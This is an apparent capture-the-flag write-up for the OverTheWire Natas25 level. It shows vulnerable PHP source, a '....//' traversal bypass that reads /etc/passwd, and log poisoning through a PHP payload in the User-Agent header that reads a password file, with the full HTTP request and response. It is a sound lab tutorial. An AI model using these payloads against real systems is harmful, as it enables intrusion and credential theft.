# Natas25
#natas #LFI #RCE #burp-suite 
## Vulnerability:
**Local file inclusion to remote code execution**: The web application allowed access to local files, even though some filters are present, and `include()` function executes any PHP code inside the provided file, even if the file's extension is not `.php`.
## Technique:
Injected PHP code into the log file through `User-Agent` HTTP header to read the password.
#### Steps:
###### 1) Analyzing the web application's source code
```php
<?php
// cheers and <3 to malvina
// - morla

function setLanguage() {
    /* language setup */
    if (array_key_exists("lang", $_REQUEST))
        if (safeinclude("language/" . $_REQUEST["lang"]))
            return 1;

    safeinclude("language/en");
}

function safeinclude($filename) {
    // check for directory traversal
    if (strstr($filename, "../")) {
        logRequest("Directory traversal attempt! fixing request.");
        $filename = str_replace("../", "", $filename);
    }

    // dont let ppl steal our passwords
    if (strstr($filename, "natas_webpass")) {
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }

    // add more checks...

    if (file_exists($filename)) {
        include($filename);
        return 1;
    }

    return 0;
}

function listFiles($path) {
    $listoffiles = array();

    if ($handle = opendir($path))
        while (false !== ($file = readdir($handle)))
            if ($file != "." && $file != "..")
                $listoffiles[] = $file;

    closedir($handle);

    return $listoffiles;
}

function logRequest($message) {
    $log = "[" . date("d.m.Y H::i:s", time()) . "]";
    $log = $log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log = $log . " \"" . $message . "\"\n";

    $fd = fopen(
        "/var/www/natas/natas25/logs/natas25_" . session_id() . ".log",
        "a"
    );

    fwrite($fd, $log);
    fclose($fd);
}
?>
```
```html
<h1>natas25</h1>

<div id="content">
    <div align="right">
        <form>
            <select name="lang" onchange="this.form.submit()">
                <option>language</option>
```
```php
                <?php
                foreach (listFiles("language/") as $f)
                    echo "<option>$f</option>";
                ?>
```
```html
            </select>
        </form>
    </div>
```
```php
    <?php
    session_start();
    setLanguage();

    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
    ?>
```
```html
    <p>
    <div id="viewsource">
        <a href="index-source.html">View sourcecode</a>
    </div>
</div>
```
The first thing we noticed is that `safeinclude()` function terminates every traversal attempt, by removing the `../`, and it stops every access to `natas_webpass` folder. After those verifications, it includes the file if it exists using `include()`. 
This function is used to include the selected language file specified by the `lang` parameter.
But what if we provided a local file instead of the expected files ?
###### 2) Exploiting the LFI vulnerability
We already mentioned that the application removes the string `"../"` from the path to language file. But it is only removed once, for example if we added `"....//"` to the path, the application will check for path traversal once, and it will remove the `../`, leaving another `../` behind. This allows us to bypass the path traversal protection and access files outside the `language/` directory.

We tried to access the `/etc/passwd` file using this method:
**URL:**
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//etc/passwd
```
**Result:**

<img width="2497" height="1225" alt="image" src="https://github.com/user-attachments/assets/a418e5a8-2c91-48a6-8d06-1ce1964e78cb" />

We successfully bypassed the directory traversal verification.
###### 3) Exploiting the RCE vulnerability
Even after bypassing the directory traversal check, we still need to access the `natas_webpass` folder, which is blocked by the second check in the `safeinclude()` function.

However, we can access the log files using directory traversal through the `lang` parameter. We'll try to inject code into that file, which will be executed since it will be included using the `include()` function.

The log file is created using the following name: 
```
$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
```
where `session_id()` is the `PHPSESSID` value.

**URL:**
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_ofiilg2hirnir51hr6o80uplij.log
```
**Result:**

<img width="1496" height="1100" alt="image" src="https://github.com/user-attachments/assets/2b46c5eb-bfe8-4627-970d-ee0ff05e786d" />

We returned to the source code, and observed an important behavior:
```php

function logRequest($message) {
    $log = "[" . date("d.m.Y H::i:s", time()) . "]";
    $log = $log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log = $log . " \"" . $message . "\"\n";

    $fd = fopen(
        "/var/www/natas/natas25/logs/natas25_" . session_id() . ".log",
        "a"
    );

    fwrite($fd, $log);
    fclose($fd);
}
```
`logRequest()` function writes the current date to the file, then it adds the `User-Agent` HTTP header which can be modified. We can try to change it, using Burp Suite, to a PHP code that prints the password for the next level.
**Request:**
```http
GET /?lang=....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_ofiilg2hirnir51hr6o80uplij.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: <?php readfile("/etc/natas_webpass/natas26"); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=ofiilg2hirnir51hr6o80uplij
Connection: keep-alive
```
We replaced `User-Agent` content with a PHP payload that will read and includes the password to the log file.
**Result:**
```http
HTTP/1.1 200 OK
Date: Sat, 08 Aug 2026 19:30:06 GMT
Server: Apache/2.4.66 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2208
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>
        var wechallinfo = {
            "level": "natas25",
            "pass": <NATAS24_PASSWORD>
        };
    </script>
</head>

<body>

    <h1>natas25</h1>

    <div id="content">
        <div align="right">
            <form>
                <select name="lang" onchange="this.form.submit()">
                    <option>language</option>
                    <option>en</option>
                    <option>de</option>
                </select>
            </form>
        </div>

        [08.08.2026 19::22:47] Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 "Directory traversal attempt! fixing request."
        [08.08.2026 19::23:16] Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 "Directory traversal attempt! fixing request."
        [08.08.2026 19::28:54] Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 "Directory traversal attempt! fixing request."
        [08.08.2026 19::30:06] <PASSWORD>
        "Directory traversal attempt! fixing request."

        <br />
        <b>Notice</b>: Undefined variable: $__GREETING
        in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b>
        <br />

        <h2></h2>

        <br />
        <b>Notice</b>: Undefined variable: $__MSG
        in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b>
        <br />

        <p align="justify">

        <br />
        <b>Notice</b>: Undefined variable: $__FOOTER
        in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b>
        <br />

        <div align="right">
            <h6></h6>
            <div>
                <p>
                <div id="viewsource">
                    <a href="index-source.html">View sourcecode</a>
                </div>
            </div>
        </div>

</body>
</html>
```
We can see the password at the last added log entry.
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas24](./Natas24.md)
## Next Level:
Coming soon!
